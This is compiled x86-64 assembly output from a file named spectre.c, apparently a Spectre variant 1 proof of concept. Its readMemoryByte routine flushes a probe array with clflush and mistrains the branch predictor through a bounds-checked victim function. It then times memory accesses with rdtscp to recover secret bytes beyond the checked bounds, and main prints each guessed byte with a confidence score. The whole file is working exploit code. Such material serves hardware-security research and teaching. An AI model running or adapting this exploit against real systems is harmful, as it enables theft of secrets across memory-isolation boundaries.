	.file	"spectre.c"
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	movslq	array1_size(%rip), %rax
	cmpq	%rdi, %rax
	seta	%al
	movzbl	%al, %eax
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.p2align 4
	.globl	test
	.type	test, @function
test:
.LFB5690:
	.cfi_startproc
	movslq	array1_size(%rip), %rax
	cmpq	%rdi, %rax
	jbe	.L3
	leaq	array1(%rip), %rax
	cmpb	%sil, (%rax,%rdi)
	je	.L5
.L3:
	ret
	.p2align 4,,10
	.p2align 3
.L5:
	movzbl	%sil, %esi
	leaq	array2(%rip), %rax
	movzbl	(%rax,%rsi), %eax
	andb	%al, temp(%rip)
	ret
	.cfi_endproc
.LFE5690:
	.size	test, .-test
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5691:
	.cfi_startproc
	movzbl	check_value(%rip), %esi
	jmp	test
	.cfi_endproc
.LFE5691:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5692:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	movl	$128, %ecx
	movl	$2863311531, %r10d
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	leaq	array2(%rip), %r14
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	leaq	131072(%r14), %r13
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	leaq	results.0(%rip), %rbp
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	subq	$56, %rsp
	.cfi_def_cfa_offset 112
	movq	%rdi, 8(%rsp)
	movq	%rbp, %rdi
	leaq	32(%rsp), %r12
	movq	%rsi, 16(%rsp)
	movq	%rdx, 24(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 40(%rsp)
	xorl	%eax, %eax
	movl	$0, 32(%rsp)
	movl	$999, 4(%rsp)
	rep stosq
.L8:
	leaq	array2(%rip), %rax
.L9:
	clflush	(%rax)
	addq	$512, %rax
	cmpq	%r13, %rax
	jne	.L9
	movl	4(%rsp), %eax
	movl	array1_size(%rip), %ecx
	xorl	%ebx, %ebx
	movq	8(%rsp), %r11
	cltd
	idivl	%ecx
	movslq	%edx, %r9
	xorq	%r9, %r11
.L15:
	movb	%bl, check_value(%rip)
	movslq	%ebx, %r15
	movl	$29, %r8d
	.p2align 4,,10
	.p2align 3
.L11:
	clflush	array1_size(%rip)
	movl	$0, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jg	.L13
	.p2align 4,,10
	.p2align 3
.L10:
	movl	36(%rsp), %eax
	addl	$1, %eax
	movl	%eax, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jle	.L10
.L13:
	movl	%r8d, %eax
	movzbl	check_value(%rip), %esi
	imulq	%r10, %rax
	shrq	$34, %rax
	leal	(%rax,%rax,2), %edx
	movl	%r8d, %eax
	addl	%edx, %edx
	subl	%edx, %eax
	subl	$1, %eax
	xorw	%ax, %ax
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%r11, %rdi
	xorq	%r9, %rdi
	call	test
	subl	$1, %r8d
	jnb	.L11
	rdtscp
	movq	%rax, %rsi
	salq	$32, %rdx
	movl	%ecx, (%r12)
	movzbl	(%r14,%r15), %eax
	orq	%rdx, %rsi
	rdtscp
	salq	$32, %rdx
	movl	%ecx, (%r12)
	orq	%rdx, %rax
	subq	%rsi, %rax
	cmpq	$50, %rax
	ja	.L14
	addl	$1, 0(%rbp,%rbx,4)
.L14:
	addq	$1, %rbx
	cmpq	$256, %rbx
	jne	.L15
	movl	0(%rbp), %esi
	movl	$1, %eax
	xorl	%ecx, %ecx
	movl	%esi, %r9d
	jmp	.L17
.L41:
	cmpl	$-1, %r8d
	je	.L22
	movslq	%r8d, %rdi
	cmpl	0(%rbp,%rdi,4), %edx
	cmovge	%eax, %r8d
.L16:
	movslq	%ecx, %rdx
	addq	$1, %rax
	movl	0(%rbp,%rdx,4), %r9d
	cmpq	$256, %rax
	je	.L40
.L17:
	movl	0(%rbp,%rax,4), %edx
	cmpl	%edx, %r9d
	jg	.L41
	movl	%ecx, %r8d
	movl	%eax, %ecx
	jmp	.L16
.L22:
	movl	%eax, %r8d
	jmp	.L16
.L40:
	movslq	%r8d, %rdi
	movl	0(%rbp,%rdi,4), %eax
	leal	4(%rax,%rax), %r11d
	cmpl	%r9d, %r11d
	jl	.L18
	cmpl	$2, %r9d
	jne	.L24
	testl	%eax, %eax
	je	.L18
.L24:
	subl	$1, 4(%rsp)
	jne	.L8
.L18:
	xorl	32(%rsp), %esi
	movl	%esi, results.0(%rip)
	movq	16(%rsp), %rsi
	movb	%cl, (%rsi)
	movq	24(%rsp), %rcx
	movl	0(%rbp,%rdx,4), %eax
	movl	%eax, (%rcx)
	movb	%r8b, 1(%rsi)
	movl	0(%rbp,%rdi,4), %eax
	movl	%eax, 4(%rcx)
	movq	40(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L42
	addq	$56, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L42:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.8
	.align 8
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5693:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	subq	$72, %rsp
	.cfi_def_cfa_offset 128
	movl	%edi, 4(%rsp)
	movq	%rsi, 8(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 56(%rsp)
	xorl	%eax, %eax
.L44:
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	je	.L62
.L45:
	cmpb	$10, %al
	je	.L44
	cmpb	$105, %al
	jne	.L54
	xorl	%eax, %eax
	call	getpid@PLT
	movl	$1, %edi
	leaq	33+check(%rip), %rdx
	leaq	.LC12(%rip), %rsi
	movl	%eax, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	jne	.L45
.L62:
	movq	secret(%rip), %rdx
	leaq	.LC2(%rip), %rsi
	movl	$1, %edi
	xorl	%eax, %eax
	leaq	array1(%rip), %rbx
	movq	%rdx, %rcx
	call	__printf_chk@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	subq	%rbx, %rax
	movq	%rax, 32(%rsp)
	call	strlen@PLT
	movl	$131072, %edx
	movl	$1, %esi
	leaq	array2(%rip), %rdi
	movl	%eax, 28(%rsp)
	movl	%eax, %r12d
	movb	$1, check_value(%rip)
	call	memset@PLT
	cmpl	$3, 4(%rsp)
	je	.L63
.L46:
	xorl	%eax, %eax
	movl	%r12d, %edx
	movl	$1, %edi
	leaq	.LC6(%rip), %rsi
	call	__printf_chk@PLT
	subl	$1, 28(%rsp)
	js	.L44
	xorl	%ebx, %ebx
	leaq	44(%rsp), %r14
	leaq	.LC7(%rip), %r15
	leaq	54(%rsp), %r13
	leaq	.LC8(%rip), %r12
	.p2align 4,,10
	.p2align 3
.L47:
	movq	secret(%rip), %rax
	movq	32(%rsp), %rdx
	movq	%r15, %rsi
	movl	$1, %edi
	movsbl	(%rax,%rbx), %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movq	32(%rsp), %rdi
	movq	%r14, %rdx
	movq	%r13, %rsi
	leaq	1(%rdi), %rax
	movq	%rax, 32(%rsp)
	call	readMemoryByte
	movl	48(%rsp), %ebp
	movl	44(%rsp), %r8d
	movq	%r12, %rsi
	leaq	.LC1(%rip), %rdx
	movl	$1, %edi
	leal	(%rbp,%rbp), %eax
	movl	%r8d, (%rsp)
	cmpl	%eax, %r8d
	leaq	.LC0(%rip), %rax
	cmovge	%rax, %rdx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movzbl	54(%rsp), %edx
	movl	(%rsp), %r8d
	movl	$63, %ecx
	leaq	.LC9(%rip), %rsi
	movl	$1, %edi
	movl	%edx, %eax
	subl	$32, %eax
	cmpb	$95, %al
	cmovb	%edx, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	testl	%ebp, %ebp
	jle	.L51
	movzbl	55(%rsp), %edx
	movl	$63, %ecx
	movl	%ebp, %r8d
	leaq	.LC10(%rip), %rsi
	movl	$1, %edi
	movl	%edx, %eax
	subl	$32, %eax
	cmpb	$95, %al
	cmovb	%edx, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
.L51:
	leaq	.LC11(%rip), %rsi
	movl	$1, %edi
	xorl	%eax, %eax
	addq	$1, %rbx
	call	__printf_chk@PLT
	movl	28(%rsp), %eax
	subl	$1, %eax
	movl	%eax, 28(%rsp)
	testl	%eax, %eax
	jns	.L47
	jmp	.L44
.L54:
	movq	56(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L64
	addq	$72, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	xorl	%eax, %eax
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L63:
	.cfi_restore_state
	movq	8(%rsp), %r15
	leaq	32(%rsp), %rdx
	leaq	.LC3(%rip), %rsi
	xorl	%eax, %eax
	movq	8(%r15), %rdi
	call	__isoc99_sscanf@PLT
	movq	16(%r15), %rdi
	leaq	28(%rsp), %rdx
	xorl	%eax, %eax
	leaq	.LC4(%rip), %rsi
	subq	%rbx, 32(%rsp)
	call	__isoc99_sscanf@PLT
	movl	28(%rsp), %ecx
	movq	32(%rsp), %rdx
	xorl	%eax, %eax
	leaq	.LC5(%rip), %rsi
	movl	$1, %edi
	call	__printf_chk@PLT
	movl	28(%rsp), %r12d
	jmp	.L46
.L64:
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5693:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32

	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
